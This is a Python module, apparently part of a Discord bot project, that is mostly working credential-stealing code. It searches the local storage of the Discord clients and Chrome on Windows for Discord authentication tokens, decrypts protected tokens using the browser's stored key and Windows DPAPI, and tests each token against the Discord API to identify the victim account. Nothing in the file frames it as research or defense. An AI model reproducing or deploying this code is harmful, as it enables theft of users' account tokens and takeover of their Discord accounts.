import re
import os
import glob
import base64
import json
from win32crypt import CryptUnprotectData
from os.path import dirname
from typing import Generator
import requests
from Crypto.Cipher import AES
from discord.ext import commands

patterns = [
    r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
    r"mfa\.[\w-]{84}",
    r"(dQw4w9WgXcQ:)([^.*\['(.*)'\].*$][^\"]*)"
]

folders = [
    f"{os.getenv('APPDATA')}\\discord\\Local Storage\\leveldb\\",
    f"{os.getenv('APPDATA')}\\discordcanary\\Local Storage\\leveldb\\",
    f"{os.getenv('APPDATA')}\\discordptb\\Local Storage\\leveldb\\",
    f"{os.getenv('LOCALAPPDATA')}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
]


def get_tokens() -> Generator[str, None, None]:
    exts = ["*.ldb", "*.log"]
    for folder in folders:
        for ext in exts:
            for file in glob.glob(folder + ext):
                with open(file, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        for pattern in patterns:
                            for token in re.findall(pattern, line):
                                if token[0] == "dQw4w9WgXcQ:":
                                    yield decrypt_token(base64.b64decode(token[1]), get_decryption_key(file)[5:])
                                else:
                                    yield token


def decrypt_token(encrypted_token, key) -> str:
    kk = CryptUnprotectData(key, None, None, None, 0)[1]
    iv = encrypted_token[3:15]
    cipher = AES.new(kk, AES.MODE_GCM, iv)
    return cipher.decrypt(encrypted_token[15:])[:-16].decode('utf-8')


def get_decryption_key(file) -> bytes:
    with open(f"{dirname(dirname(dirname(file)))}\\Local State", "rb") as f:
        js = json.load(f)

    encrypted_key = base64.b64decode(js['os_crypt']['encrypted_key'])
    return encrypted_key


def force_decode(b: bytes):
    return b.decode(json.detect_encoding(b))


def check_token(token: str) -> str:
    head = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
        "Authorization": token,
    }

    r = requests.get("https://discord.com/api/v9/users/@me", headers=head)
    if r.status_code == 200:
        js = r.json()
        return f"User: {js['username']}#{js['discriminator']} | ID: {js['id']}"
    else:
        return "Invalid"


def load_cogs(bot:commands.Bot):
    for file in os.listdir("cogs"):
        if file.endswith(".py"):
            bot.load_extension(f"cogs.{file[:-3]}")
